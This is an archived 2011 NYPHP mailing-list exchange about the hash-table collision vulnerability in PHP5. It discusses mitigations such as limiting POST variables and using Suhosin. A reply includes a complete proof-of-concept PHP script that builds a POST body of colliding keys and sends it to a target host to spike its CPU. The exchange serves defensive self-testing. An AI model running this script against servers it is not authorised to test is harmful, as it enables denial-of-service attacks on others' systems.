<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-51353372-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-51353372-3');
</script>
   <TITLE> [nycphp-talk] Hash Table Vulnerability in PHP5
   </TITLE>
   <LINK REL="Index" HREF="http://nyphp.org/pipermail/talk/2011-December/index.html" >
   <LINK REL="made" HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20Hash%20Table%20Vulnerability%20in%20PHP5&In-Reply-To=%3C00ff01ccc680%2452ab3fd0%24f801bf70%24%40cyberxdesigns.com%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="031050.html">
   <LINK REL="Next"  HREF="031052.html">
 <meta name="description" content="PHP jobs stackware web application support and development forums for Mongo LAMP MySQL SQL Windows IIS Linux." />
<meta name="author" content="Stackware Web Development - http://stackware.com" />
<meta name="verify-v1" content="zWMoPwMn/dolscLkjLXTpRqgr9K8bzlzL1vM9WTjpHc=" />
<meta name="msvalidate.01" content="F85F81C1D0BAB5C349E8395628845E27" />
<meta name="y_key" content="265502be3db4fb6e" />
</HEAD>
         <BODY BGCOLOR="#ffffff">
<h1 style="float: right; margin: 0; padding: 0 0 0 15px;"><a href="https://www.meetup.com/new-york-php/">NYCPHP Meetup</a></h1><h1><a href="http://www.nyphp.org">NYPHP.org</a></h1>
   <H1>[nycphp-talk] Hash Table Vulnerability in PHP5</H1>
    <B>Hans C. Kaspersetz</B> 
    <A HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20Hash%20Table%20Vulnerability%20in%20PHP5&In-Reply-To=%3C00ff01ccc680%2452ab3fd0%24f801bf70%24%40cyberxdesigns.com%3E"
       TITLE="[nycphp-talk] Hash Table Vulnerability in PHP5">hans at cyberxdesigns.com
       </A><BR>
    <I>Thu Dec 29 18:19:32 EST 2011</I>
    <P><UL>
        <LI>Previous message: <A HREF="031050.html">[nycphp-talk] Hash Table Vulnerability in PHP5
</A></li>
        <LI>Next message: <A HREF="031052.html">[nycphp-talk] Hash Table Vulnerability in PHP5
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#31051">[ date ]</a>
              <a href="thread.html#31051">[ thread ]</a>
              <a href="subject.html#31051">[ subject ]</a>
              <a href="author.html#31051">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Ben,

 

Thanks for the reply.  I ran the PoC below against my servers and it looks
like we are in ok shape.  After reading your response, I contemplated the
options and realized that we are running Suhosin and are already managing
the max post|request variables.  Dur...

 

Here is a bit more reading for the group:
<A HREF="http://seclists.org/fulldisclosure/2011/Dec/486.">http://seclists.org/fulldisclosure/2011/Dec/486.</A>

 

Have a great new years!


Hans Kaspersetz

Cyber X Designs

<A HREF="http://cyberxdesigns.com">http://cyberxdesigns.com</A>

 

 

From: <A HREF="http://lists.nyphp.org/mailman/listinfo/talk">talk-bounces at lists.nyphp.org</A> [mailto:<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">talk-bounces at lists.nyphp.org</A>] On
Behalf Of Ben Sgro
Sent: Thursday, December 29, 2011 11:33 AM
To: NYPHP Talk
Subject: Re: [nycphp-talk] Hash Table Vulnerability in PHP5

 

Hey, 

 

Don't allow posts w/&gt; ~100 k/v pairs. Don't allow larger uploads then is
necessary. As you mentioned, I guess limit script execution time.

Right now, there's some snort signatures going around (Not sure if you run
IDS, etc). I've also heard people mention a mod_rewrite regex

to strip out these bads chars.

 

I have a PoC here you can test against your servers: (And here also:
<A HREF="http://koto.github.com/blog-kotowicz-net-examples/hashcollision/kill.html">http://koto.github.com/blog-kotowicz-net-examples/hashcollision/kill.html</A>)

 

&lt;?php

// v--- ripped from:
<A HREF="https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision">https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision</A>


//


// generate POST of Doom


function doom() {

  // entries with collisions in PHP hashtable hash function


  $a = array(

             '0' =&gt; 'Ez',

             '1' =&gt; 'FY',

             '2' =&gt; 'G8',

             '3' =&gt; 'H' . chr(23),

             '4' =&gt; 'D'.chr(122+33),

             );

  // how long should the payload be


  $length = 7;

 

  $size = count($a);

 

  $post = '';

  $max = pow($size,$length);

  for ($i = 0; $i &lt; $max; $i++) {

    $s = str_pad(base_convert($i, 10, $size), $length, '0', STR_PAD_LEFT);

    $post .= '' . (urlencode(strtr($s, $a))) . '=&amp;';

  }

 

  return $post;

}

 

// hashcollider.php


// by sk


 

$post = doom();

$ch   = curl_init();

$args = getopt(&quot;h:&quot;);

$host = $args['h'];

 

curl_setopt($ch, CURLOPT_URL,            $host);

curl_setopt($ch, CURLOPT_POST,           1 );

curl_setopt($ch, CURLOPT_POSTFIELDS,     $post);

 

printf(&quot;[x] Target: %s\n&quot;, $host);

printf(&quot;[x] CPU spike!\n&quot;);

$result=curl_exec ($ch);

printf(&quot;[x] Payload sent.\n&quot;);

 

Good luck!

 

- Ben

 

On Dec 29, 2011, at 11:19 AM, Hans C. Kaspersetz wrote:





Good morning,

 

I hope everyone has seen the news about the Hash Table Vulnerability in lots
of web scripting languages.  You can read about it here:
<A HREF="http://www.securityweek.com/hash-table-collision-attacks-could-trigger-ddos-">http://www.securityweek.com/hash-table-collision-attacks-could-trigger-ddos-</A>
massive-scale or here <A HREF="http://www.kb.cert.org/vuls/id/903934.">http://www.kb.cert.org/vuls/id/903934.</A>

 

It looks like PHP has addressed the issue
(<A HREF="http://www.php.net/archive/2011.php#id2011-12-25-1">http://www.php.net/archive/2011.php#id2011-12-25-1</A>)  by providing a max var
directive in the latest RC5 for 5.4.0.  However, with all release candidates
they are strongly advising against using it in production.

 

What is the general consensus for mitigating this risk without moving to
RC5?

 

We are limiting the execution time of our scripts, however for upload
scripts or processing intensive scripts we need to increase the execution
time which I image would leave those scripts more vulnerable.

 

Thanks,

Hans Kaspersetz

Cyber X Designs

<A HREF="http://cyberxdesigns.com">http://cyberxdesigns.com</A>

 

_______________________________________________
New York PHP Users Group Community Talk Mailing List
<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">http://lists.nyphp.org/mailman/listinfo/talk</A>

<A HREF="http://www.nyphp.org/Show-Participation">http://www.nyphp.org/Show-Participation</A>

 

-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<A HREF="http://lists.nyphp.org/pipermail/talk/attachments/20111229/fda729e2/attachment.html">http://lists.nyphp.org/pipermail/talk/attachments/20111229/fda729e2/attachment.html</A>&gt;
</PRE>

<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="031050.html">[nycphp-talk] Hash Table Vulnerability in PHP5
</A></li>
	<LI>Next message: <A HREF="031052.html">[nycphp-talk] Hash Table Vulnerability in PHP5
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#31051">[ date ]</a>
              <a href="thread.html#31051">[ thread ]</a>
              <a href="subject.html#31051">[ subject ]</a>
              <a href="author.html#31051">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://lists.nyphp.org/mailman/listinfo/talk">More information about the talk
mailing list</a><br>
</body></html>
